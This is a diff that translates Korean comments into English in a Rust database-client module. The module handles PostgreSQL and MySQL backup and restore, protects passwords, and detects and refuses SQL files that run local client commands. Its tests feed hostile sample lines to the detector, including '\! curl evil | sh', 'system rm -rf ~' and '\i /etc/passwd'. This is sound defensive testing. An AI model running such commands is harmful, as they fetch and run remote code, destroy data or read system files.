@@ -1,5 +1,5 @@
-//! 백업·복원: pg_dump / pg_restore / psql, mysqldump / mysql 을 돌린다 (PATH 와 흔한 설치 위치에서 찾는다).
-//! 비밀번호는 명령줄이 아니라 환경변수로 (ps 에 보이지 않게). SSH 터널이면 터널 포트로. 진행은 쓴(읽은) 바이트
+//! Backup / restore: runs pg_dump / pg_restore / psql, mysqldump / mysql (found in PATH and common install locations).
+//! Passwords go via environment variables, not the command line (so they don't show in ps). With an SSH tunnel, the tunnel port is used. Progress is bytes written (read)
 use crate::app::{AppState, ensure_pool, split_target};
 use crate::error::{AppError, AppResult};
 use crate::store::DbKind;
@@ -11,14 +11,14 @@ use std::sync::atomic::Ordering;
 #[derive(Debug, Clone, Default, serde::Deserialize)]
 #[serde(rename_all = "camelCase")]
 pub struct BackupOptions {
-    /// PG: "custom" (pg_restore 로 되살린다, 기본) · "plain" (SQL 파일)
+    /// PG: "custom" (restored with pg_restore, default) · "plain" (SQL file)
     #[serde(default)]
     pub format: String,
     #[serde(default)]
     pub schema_only: bool,
     #[serde(default)]
     pub data_only: bool,
-    /// PG: 이 스키마들만 (비면 전부)
+    /// PG: only these schemas (empty = all)
     #[serde(default)]
     pub schemas: Vec<String>,
 }
@@ -26,18 +26,18 @@ pub struct BackupOptions {
 #[derive(Debug, Clone, Default, serde::Deserialize)]
 #[serde(rename_all = "camelCase")]
 pub struct RestoreOptions {
-    /// PG custom: 있던 객체를 먼저 지운다 (--clean --if-exists)
+    /// PG custom: drop existing objects first (--clean --if-exists)
     #[serde(default)]
     pub clean: bool,
 }
 
-/// 도구가 있을 만한 폴더 (PATH 다음)
+/// Folders where tools are likely to be (after PATH)
 fn tool_dirs() -> Vec<PathBuf> {
     let mut dirs: Vec<PathBuf> = std::env::var_os("PATH").map(|p| std::env::split_paths(&p).collect()).unwrap_or_default();
     for d in ["/opt/homebrew/bin", "/usr/local/bin", "/opt/homebrew/opt/libpq/bin", "/usr/local/opt/libpq/bin", "/opt/homebrew/opt/mysql-client/bin", "/usr/local/opt/mysql-client/bin", "/opt/homebrew/opt/mysql/bin", "/usr/local/mysql/bin", "/usr/bin"] {
         dirs.push(d.into());
     }
-    // 버전별 폴더: postgresql@16, mysql-client@8.4, Postgres.app, /usr/lib/postgresql/16
+    // Per-version folders: postgresql@16, mysql-client@8.4, Postgres.app, /usr/lib/postgresql/16
     for (parent, prefix, sub) in [
         ("/opt/homebrew/opt", "postgresql@", "bin"),
         ("/usr/local/opt", "postgresql@", "bin"),
@@ -65,13 +65,13 @@ fn version_of(p: &Path) -> Vec<u64> {
     text.split(|c: char| !c.is_ascii_digit() && c != '.').find(|w| w.contains('.') || w.parse::<u64>().is_ok()).map(|w| w.split('.').filter_map(|x| x.parse().ok()).collect()).unwrap_or_default()
 }
 
-/// 도구 위치: PATH, Homebrew·Postgres.app·리눅스 기본 위치. 여럿이면 버전이 가장 높은 것
+/// Tool location: PATH, Homebrew, Postgres.app, Linux default locations. If several, the highest version
 pub fn find_tool(name: &str) -> Option<PathBuf> {
     find_tool_for(name, None)
 }
 
-/// 서버 주 버전에 맞는 도구: 서버 이상 중 가장 가까운 것 (pg_dump 는 서버보다 낮으면 못 쓰고, 너무 높으면 옛 서버가 모르는 SET 을 쓴다).
-/// 서버 이상이 없으면 가장 높은 것 (도구가 버전 차이를 알려 준다)
+/// Tool matching the server major version: the closest one at or above the server (pg_dump can't be used if older than the server, and if too new it emits SETs an old server doesn't know).
+/// If none is at or above the server, the highest one (the tool reports the version mismatch)
 pub fn find_tool_for(name: &str, server_major: Option<u64>) -> Option<PathBuf> {
     let mut found: Vec<PathBuf> = tool_dirs().into_iter().map(|d| d.join(name)).filter(|p| p.is_file()).collect();
     found.dedup();
@@ -85,16 +85,16 @@ pub fn find_tool_for(name: &str, server_major: Option<u64>) -> Option<PathBuf> {
     with_v.pop().map(|x| x.1)
 }
 
-/// PG 서버 주 버전 (16, 17 …)
+/// PG server major version (16, 17 …)
 async fn pg_major(st: &AppState, id: &str) -> Option<u64> {
     let r = ensure_pool(st, id).await.ok()?.run_query("SHOW server_version_num", 1).await.ok()?;
     crate::db::cell_text(r.rows.first()?.first()?).parse::<u64>().ok().map(|n| n / 10000)
 }
 
-/// 새 pg_dump 가 백업 머리에 넣는데 예전 서버는 모르는 설정 (이름, 생긴 버전)
+/// Settings that newer pg_dump puts in the dump header but older servers don't know (name, version introduced)
 const NEWER_SETTINGS: &[(&str, u64)] = &[("SET transaction_timeout", 17)];
 
-/// 예전 서버가 모르는 SET 줄을 뺀 SQL 사본 (뺄 것이 없는 서버면 None)
+/// Copy of the SQL without SET lines an older server doesn't know (None if the server needs nothing removed)
 fn strip_newer_settings(src: &Path, server: Option<u64>) -> AppResult<Option<PathBuf>> {
     use std::io::{BufRead, Write};
     let drop: Vec<&str> = NEWER_SETTINGS.iter().filter(|(_, v)| server.is_some_and(|s| s < *v)).map(|(n, _)| *n).collect();
@@ -115,7 +115,7 @@ fn strip_newer_settings(src: &Path, server: Option<u64>) -> AppResult<Option<Pat
     Ok(Some(out))
 }
 
-/// 본인만 읽고 쓰는 파일 (0600). 덤프에는 데이터가 다 들어 있어서 /tmp 에서 남이 읽지 못하게
+/// File readable and writable only by the owner (0600). The dump contains all the data, so others can't read it in /tmp
 fn private_file(path: &Path) -> std::io::Result<std::fs::File> {
     let mut o = std::fs::OpenOptions::new();
     o.write(true).create(true).truncate(true);
@@ -124,7 +124,7 @@ fn private_file(path: &Path) -> std::io::Result<std::fs::File> {
         use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};
         o.mode(0o600);
         let f = o.open(path)?;
-        // 이미 있던 파일 (사용자가 덮어쓰기로 고른 백업 파일) 도
+        // Also for a file that already existed (a backup file the user chose to overwrite)
         f.set_permissions(std::fs::Permissions::from_mode(0o600))?;
         return Ok(f);
     }
@@ -132,14 +132,14 @@ fn private_file(path: &Path) -> std::io::Result<std::fs::File> {
     o.open(path)
 }
 
-/// pg_dump · pg_restore · psql 의 -d: 값은 접속 문자열로도 읽히므로 (host=… 를 넣으면 다른 서버로 간다) DB 이름 하나로 묶는다
+/// The -d of pg_dump · pg_restore · psql: the value is also parsed as a connection string (putting host=… in it goes to another server), so pin it to just a DB name
 fn pg_dbname(db: &str) -> String {
     format!("dbname='{}'", db.replace('\\', "\\\\").replace('\'', "\\'"))
 }
 
-/// SQL 파일 안에서 이 컴퓨터에 무언가를 하는 클라이언트 명령 (그 줄). 보조 검사: psql 은 \restrict, mysql 은 --binary-mode 로 끈다.
-/// psql: 문자열 · 주석 · 달러 인용 · COPY 데이터 밖의 \명령 어디든 (\connect · \. · \encoding 만 된다),
-/// mysql: 줄 머리의 system · tee · pager · source · connect … 와 \! · \T · \P · \. · \r
+/// Client commands in an SQL file that do something on this computer (that line). Secondary check: psql disables them with \restrict, mysql with --binary-mode.
+/// psql: \commands anywhere outside strings · comments · dollar quotes · COPY data (only \connect · \. · \encoding are allowed),
+/// mysql: system · tee · pager · source · connect … at the start of a line, and \! · \T · \P · \. · \r
 pub fn local_command(sql: impl std::io::BufRead, kind: DbKind) -> Option<String> {
     if kind == DbKind::Mysql {
         for line in sql.split(b'\n') {
@@ -154,7 +154,7 @@ pub fn local_command(sql: impl std::io::BufRead, kind: DbKind) -> Option<String>
         }
         return None;
     }
-    // PostgreSQL: 바이트 단위로 상태를 따라간다
+    // PostgreSQL: track state byte by byte
     #[derive(PartialEq)]
     enum St {
         Code,
@@ -170,7 +170,7 @@ pub fn local_command(sql: impl std::io::BufRead, kind: DbKind) -> Option<String>
         let Ok(b) = line else { return Some("(can't read the file)".into()) };
         let shown = || String::from_utf8_lossy(&b).into_owned();
         if st == St::Copy {
-            // COPY 데이터는 \. 한 줄로 끝난다
+            // COPY data ends with a single \. line
             if b.trim_ascii() == b"\\." {
                 st = St::Code;
             }
@@ -226,7 +226,7 @@ pub fn local_command(sql: impl std::io::BufRead, kind: DbKind) -> Option<String>
                             return Some(shown());
                         }
                     }
-                    // COPY … FROM stdin; 다음 줄부터는 데이터 (pg_dump 는 COPY 를 한 줄에 쓴다)
+                    // After COPY … FROM stdin; the following lines are data (pg_dump writes COPY on one line)
                     b';' => {
                         let stmt = String::from_utf8_lossy(&b[..i]).to_lowercase();
                         if stmt.trim_start().starts_with("copy ") && stmt.trim_end().ends_with("from stdin") {
@@ -253,12 +253,12 @@ fn missing(tool: &str) -> AppError {
     AppError::Msg(format!("{tool} was not found. {hint}"))
 }
 
-/// 접속 정보: (호스트, 포트, 사용자, DB, 비밀번호, 설정)
+/// Connection info: (host, port, user, DB, password, settings)
 async fn endpoint(st: &AppState, id: &str) -> AppResult<(String, u16, String, String, Option<String>, crate::store::ConnectionConfig)> {
     let cfg = st.source(id)?;
     let (base, db) = split_target(id);
     let db = db.map(String::from).unwrap_or_else(|| crate::sql::default_db(&cfg));
-    // SSH 터널이면 터널을 연 뒤 그 포트로
+    // With an SSH tunnel, open the tunnel and use its port
     ensure_pool(st, id).await?;
     let local = st.tunnels.read().await.get(id).map(|t| t.local_port);
     let (host, port) = match local {
@@ -268,7 +268,7 @@ async fn endpoint(st: &AppState, id: &str) -> AppResult<(String, u16, String, St
     Ok((host, port, cfg.user.clone(), db, st.secret(base)?, cfg))
 }
 
-/// psql 이 \restrict 를 아는지 (17.6 · 16.10 · 15.14 · 14.19 · 13.22 부터)
+/// Whether psql knows \restrict (from 17.6 · 16.10 · 15.14 · 14.19 · 13.22)
 fn psql_restricts(v: &[u64]) -> bool {
     let (major, minor) = (v.first().copied().unwrap_or(0), v.get(1).copied().unwrap_or(0));
     match major {
@@ -282,13 +282,13 @@ fn psql_restricts(v: &[u64]) -> bool {
     }
 }
 
-/// mysql 이 --system-command 를 아는지 (8.0.40 · 8.4.3 · 9.1 부터)
+/// Whether mysql knows --system-command (from 8.0.40 · 8.4.3 · 9.1)
 fn mysql_has_system_command_option(tool: &Path) -> bool {
     std::process::Command::new(tool).arg("--help").output().map(|o| String::from_utf8_lossy(&o.stdout).contains("--system-command")).unwrap_or(false)
 }
 
-/// psql 에 넣을 사본 (0600): 예전 서버가 모르는 SET 을 빼고, key 가 있으면 맨 앞에 \restrict key 를 붙이고 파일 안의 \restrict · \unrestrict 는 뺀다
-/// (pg_dump 17.6+ 가 쓰는 줄. 남겨 두면 덤프가 정한 키로 명령을 다시 켤 수 있다)
+/// Copy to feed psql (0600): removes SETs an older server doesn't know, prepends \restrict key if there is a key, and removes \restrict · \unrestrict in the file
+/// (lines pg_dump 17.6+ writes. If left in, commands could be re-enabled with a key chosen by the dump)
 fn prepare_psql_input(src: &Path, server: Option<u64>, key: Option<String>) -> AppResult<PathBuf> {
     use std::io::{BufRead, Write};
     let drop: Vec<&str> = NEWER_SETTINGS.iter().filter(|(_, v)| server.is_some_and(|s| s < *v)).map(|(n, _)| *n).collect();
@@ -315,7 +315,7 @@ fn prepare_psql_input(src: &Path, server: Option<u64>, key: Option<String>) -> A
     Ok(out)
 }
 
-/// 복원할 SQL 에 이 컴퓨터에서 명령을 돌리는 줄이 있으면 멈춘다 (pg_dump · mysqldump 는 그런 줄을 쓰지 않는다)
+/// Stop if the SQL to restore has lines that run commands on this computer (pg_dump · mysqldump don't write such lines)
 fn refuse_local_commands(file: &Path, kind: DbKind) -> AppResult<()> {
     match local_command(std::io::BufReader::new(std::fs::File::open(file)?), kind) {
         Some(line) => Err(AppError::Msg(format!("This file runs commands on your computer, so it was not restored (pg_dump / mysqldump never write these):\n{}", line.chars().take(200).collect::<String>()))),
@@ -323,7 +323,7 @@ fn refuse_local_commands(file: &Path, kind: DbKind) -> AppResult<()> {
     }
 }
 
-/// 도구를 돌린다: stdin = 이 파일을 넣으며 진행, stdout = 이 파일로, watch = 이 파일 크기로 진행. 취소되면 끝낸다
+/// Run a tool: stdin = feed this file with progress, stdout = into this file, watch = progress by this file's size. Kill it on cancel
 async fn run_tool(mut cmd: tokio::process::Command, tool: &str, stdin: Option<&Path>, stdout: Option<&Path>, watch: Option<&Path>, job: &Arc<Job>) -> AppResult<()> {
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
     cmd.stderr(std::process::Stdio::piped()).kill_on_drop(true);
@@ -385,8 +385,8 @@ async fn run_tool(mut cmd: tokio::process::Command, tool: &str, stdin: Option<&P
     Ok(())
 }
 
-/// PG 접속 환경변수 (비밀번호·SSL 은 명령줄에 싣지 않는다)
-/// 도구에 넘기는 비밀번호 파일 (0600, 도구가 끝나면 지운다)
+/// PG connection environment variables (password and SSL are not put on the command line)
+/// Password file passed to the tool (0600, deleted when the tool finishes)
 struct SecretTemp(PathBuf);
 
 impl Drop for SecretTemp {
@@ -403,7 +403,7 @@ fn secret_temp(prefix: &str, content: &str) -> AppResult<SecretTemp> {
     Ok(SecretTemp(path))
 }
 
-/// 비밀번호는 환경 변수가 아니라 이 서버 · 사용자에만 맞는 PGPASSFILE 로 (덤프 안의 \connect 가 다른 서버로 가도 따라가지 않는다)
+/// Password goes via a PGPASSFILE matching only this server · user, not an environment variable (so a \connect in the dump to another server doesn't carry it along)
 fn pg_env(cmd: &mut tokio::process::Command, host: &str, port: u16, user: &str, password: Option<&str>, cfg: &crate::store::ConnectionConfig) -> AppResult<Option<SecretTemp>> {
     let esc = |s: &str| s.replace('\\', "\\\\").replace(':', "\\:");
     let pass = match password {
@@ -432,7 +432,7 @@ fn pg_env(cmd: &mut tokio::process::Command, host: &str, port: u16, user: &str, 
     Ok(pass)
 }
 
-/// 비밀번호는 --defaults-extra-file (0600) 로. 이 옵션은 맨 앞이어야 한다
+/// Password via --defaults-extra-file (0600). This option must come first
 fn my_args(cmd: &mut tokio::process::Command, host: &str, port: u16, user: &str, password: Option<&str>, cfg: &crate::store::ConnectionConfig) -> AppResult<Option<SecretTemp>> {
     let pass = match password {
         Some(p) => {
@@ -456,7 +456,7 @@ fn my_args(cmd: &mut tokio::process::Command, host: &str, port: u16, user: &str,
 }
 
 impl AppState {
-    /// 백업 파일을 만든다. 쓴 바이트 (실패·취소하면 쓰던 파일을 지운다)
+    /// Create a backup file. Bytes written (on failure or cancel, the partial file is deleted)
     pub async fn backup(&self, id: String, path: String, opts: BackupOptions, job_id: String) -> AppResult<u64> {
         let job = self.job(&job_id).unwrap_or_else(|| self.start_job(&job_id));
         let file = PathBuf::from(&path);
@@ -492,7 +492,7 @@ impl AppState {
                     if opts.data_only {
                         cmd.arg("--no-create-info");
                     }
-                    // -- 뒤는 DB 이름으로만 읽는다 (서버가 보여 준 "--tee=…" 같은 이름이 옵션이 되지 않게)
+                    // After -- it is read only as a DB name (so a server-provided name like "--tee=…" doesn't become an option)
                     cmd.arg("--").arg(&db);
                     run_tool(cmd, "mysqldump", None, Some(&file), Some(&file), &job).await?;
                 }
@@ -509,7 +509,7 @@ impl AppState {
         r
     }
 
-    /// 백업 파일로 되살린다 (pg_dump custom → pg_restore, SQL → psql / mysql). 한 트랜잭션: 실패하면 되돌린다 (MySQL DDL 은 예외)
+    /// Restore from a backup file (pg_dump custom → pg_restore, SQL → psql / mysql). One transaction: rolled back on failure (except MySQL DDL)
     pub async fn restore(&self, id: String, path: String, opts: RestoreOptions, job_id: String) -> AppResult<()> {
         let job = self.job(&job_id).unwrap_or_else(|| self.start_job(&job_id));
         let file = PathBuf::from(&path);
@@ -534,9 +534,9 @@ impl AppState {
                             cmd.args(["--clean", "--if-exists"]);
                         }
                         if NEWER_SETTINGS.iter().any(|(_, v)| server.is_some_and(|s| s < *v)) {
-                            // 예전 서버: SQL 로 풀어서 모르는 설정을 빼고 psql 로 (pg_restore 는 그 SET 에서 멈춘다)
+                            // Older server: expand to SQL, remove unknown settings, and use psql (pg_restore stops at those SETs)
                             let tmp = std::env::temp_dir().join(format!("qurry-restore-{}.sql", uuid::Uuid::new_v4()));
-                            // pg_restore 가 쓰기 전에 본인만 읽는 파일로 만들어 둔다 (덤프에는 데이터가 다 들어 있다)
+                            // Create it as an owner-only file before pg_restore writes (the dump contains all the data)
                             drop(private_file(&tmp)?);
                             cmd.arg("-f").arg(&tmp).arg(&file);
                             let r = run_tool(cmd, "pg_restore", None, None, None, &job).await;
@@ -554,7 +554,7 @@ impl AppState {
                     if !custom || sql_file.is_some() {
                         let src0 = sql_file.clone().unwrap_or_else(|| file.clone());
                         let tool = find_tool_for("psql", server).ok_or_else(|| missing("psql"))?;
-                        // psql 명령 (\! · \o · \copy … program · \connect …) 은 \restrict 로 끈다. 그걸 모르는 예전 psql 은 줄을 읽어 본다
+                        // psql commands (\! · \o · \copy … program · \connect …) are disabled with \restrict. For older psql that doesn't know it, read the lines
                         let restrict = psql_restricts(&version_of(&tool));
                         if !restrict {
                             refuse_local_commands(&src0, DbKind::Postgres)?;
@@ -581,7 +581,7 @@ impl AppState {
                     let system_off = mysql_has_system_command_option(&tool);
                     let mut cmd = tokio::process::Command::new(tool);
                     let _pass = my_args(&mut cmd, &host, port, &user, password.as_deref(), &cfg)?;
-                    // mysql 클라이언트 명령 (system · tee · pager · source · connect …) 을 끈다 (charset · delimiter 만 남는다)
+                    // Disable mysql client commands (system · tee · pager · source · connect …) (only charset · delimiter remain)
                     cmd.arg("--binary-mode");
                     if system_off {
                         cmd.arg("--system-command=OFF");
@@ -619,12 +619,12 @@ mod tests {
         for bad in ["\\! curl evil | sh", "  \\o |cat > ~/.zshrc", "\\g |sh", "\\copy t to program 'sh'", "\\i /etc/passwd", "\\setenv PAGER x"] {
             assert!(local_command(format!("select 1;\n{bad}\n").as_bytes(), Postgres).is_some(), "{bad}");
         }
-        // 줄 가운데 · 파이프 없는 파일 쓰기 · 달러 인용으로 COPY 를 흉내 낸 것
+        // Mid-line · file writes without a pipe · COPY imitated with dollar quotes
         for bad in ["select 1; \\! id", "select 1 \\g |sh", "\\o ~/.zshrc", "\\w file", "\\copy (select 1) to '/tmp/x'", "\\lo_export 1 /tmp/x", "\\s file",
             "select $$\ncopy t from stdin;\n$$;\n\\! id\n\\.", "\\restrict k"] {
             assert!(local_command(format!("select 1;\n{bad}\n").as_bytes(), Postgres).is_some(), "{bad}");
         }
-        // 문자열 · 달러 인용 · 주석 안의 \ 는 상관없다
+        // \ inside strings · dollar quotes · comments doesn't matter
         assert!(local_command("select E'a\\nb', 'x\\y';\n-- \\! not run\ncreate function f() returns text as $f$ select '\\!' $f$ language sql;\ninsert into t values ('line\n\\! inside a string');\n".as_bytes(), Postgres).is_none());
         assert!(local_command("-- MySQL dump\nCREATE TABLE t (a int);\nINSERT INTO t VALUES (1);\n".as_bytes(), Mysql).is_none());
         for bad in ["system rm -rf ~", "system\tid", "\\! id", "tee /Users/x/.zshrc", "\\T /tmp/x", "pager sh", "source /etc/passwd", "connect db evil.host"] {
@@ -632,7 +632,7 @@ mod tests {
         }
     }
 
-    /// psql 입력 사본: 맨 앞 \restrict 키, 파일 안의 \restrict · \unrestrict 는 빼고, 0600
+    /// psql input copy: \restrict key at the top, \restrict · \unrestrict in the file removed, 0600
     #[test]
     fn psql_input_is_restricted() {
         assert!(psql_restricts(&[17, 6]) && psql_restricts(&[16, 10]) && psql_restricts(&[18, 0]) && !psql_restricts(&[16, 9]) && !psql_restricts(&[12, 22]));
@@ -669,7 +669,7 @@ mod tests {
 
     #[test]
     fn finds_tools_or_explains() {
-        // 이 PC 에 없으면 None (설치 안내는 backup 이 한다)
+        // None if not on this PC (backup shows install instructions)
         if let Some(p) = find_tool("pg_dump") {
             assert!(p.ends_with("pg_dump"));
         }
@@ -686,7 +686,7 @@ mod tests {
         Some(st)
     }
 
-    /// pgvector (확장이 있는 서버에서만): 가까운 행 SQL 이 인덱스 연산자를 쓰고 거리 순으로 나온다. 벡터 값은 글로 보인다
+    /// pgvector (only on servers with the extension): nearest-row SQL uses the index operator and returns rows by distance. Vector values show as text
     #[tokio::test]
     #[ignore]
     async fn pgvector_similar_rows() {
@@ -708,13 +708,13 @@ mod tests {
         assert_eq!(r.rows.iter().map(|x| x[name].clone()).collect::<Vec<_>>(), vec![serde_json::json!("apricot"), serde_json::json!("pear")]);
         let emb = r.columns.iter().position(|c| c.name == "embedding").unwrap();
         assert_eq!(r.rows[0][emb], serde_json::json!("[0.9,0.1,0]"));
-        // halfvec · sparsevec 도 PG 가 보여 주는 글 그대로
+        // halfvec · sparsevec also as the text PG shows
         let h = q("select '[1,0.5,-2]'::halfvec h, '{1:0.5,3:1}/5'::sparsevec s, '[0.25,1e-3]'::vector v").await.unwrap();
         assert_eq!(h.rows[0], vec![serde_json::json!("[1,0.5,-2]"), serde_json::json!("{1:0.5,3:1}/5"), serde_json::json!("[0.25,0.001]")]);
         q("drop table qurry_vec").await.ok();
     }
 
-    /// MySQL: mysqldump → 지우기 → mysql 로 되살리기 (도구가 있을 때만)
+    /// MySQL: mysqldump → drop → restore with mysql (only when the tools are available)
     #[tokio::test]
     #[ignore]
     async fn mysql_backup_and_restore_roundtrip() {
@@ -727,7 +727,7 @@ mod tests {
         let st = crate::open_state(Some(dir.clone())).unwrap();
         let cfg: crate::store::ConnectionConfig = serde_json::from_value(serde_json::json!({ "id": "m", "name": "m", "kind": "mysql", "host": p[0], "port": p[1].parse::<u16>().unwrap(), "user": p[2], "database": p[4] })).unwrap();
         st.save_connection(cfg, Some(p[3].into()), None).await.unwrap();
-        // 전용 DB: 다른 테스트가 같은 DB 에서 테이블을 만들고 지우는 동안 덤프하면 깨진다
+        // Dedicated DB: dumping while other tests create and drop tables in the same DB breaks it
         st.run_query("m".into(), "create database if not exists qurry_bak".into(), None, None).await.unwrap();
         let q = |s: &str| st.run_query("m::qurry_bak".into(), s.into(), None, None);
         q("drop table if exists bak_t").await.ok();
@@ -741,7 +741,7 @@ mod tests {
         st.run_query("m".into(), "drop database qurry_bak".into(), None, None).await.ok();
     }
 
-    /// 백업 → 지우기 → 되살리기 → 데이터가 그대로 (custom 과 SQL 둘 다)
+    /// Backup → drop → restore → data unchanged (both custom and SQL)
     #[tokio::test]
     #[ignore]
     async fn pg_backup_and_restore_roundtrip() {
@@ -764,7 +764,7 @@ mod tests {
             st.restore("b".into(), file, RestoreOptions::default(), format!("r-{format}")).await.unwrap();
             assert_eq!(q("select count(*) from qurry_bak.t").await.unwrap().rows[0][0], serde_json::json!(5000), "{format}");
         }
-        // 비밀번호 같은 것이 명령줄로 가지 않는다: 실패해도 메시지에 도구 출력이 실린다
+        // Things like passwords don't go on the command line: even on failure, the tool output is in the message
         let e = st.restore("b".into(), dir.join("missing.sql").to_string_lossy().into(), RestoreOptions::default(), "r-x".into()).await.unwrap_err().to_string();
         assert!(!e.is_empty());
         q("drop schema qurry_bak cascade").await.ok();
